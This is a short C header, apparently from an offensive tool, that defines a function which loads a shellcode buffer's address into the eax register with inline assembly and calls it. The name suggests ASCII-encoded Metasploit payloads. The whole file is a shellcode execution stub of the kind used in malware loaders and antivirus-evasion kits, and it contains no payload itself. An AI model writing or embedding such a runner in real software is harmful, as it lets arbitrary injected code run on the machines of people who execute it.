#pragma once

#include <stdio.h>


void exec_shellcode_ASCIIMSF(unsigned char *shellcode) {
	#ifdef PRINT_DEBUG
		printf("exec_shellcode_ASCIIMSF\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

    // Check for NULL pointer to handle cases where no shellcode data was retrieved
    if(shellcode != NULL) {
	    register unsigned char* r asm("eax");
	    r=shellcode;
	    asm("call *%eax;");
    }
}
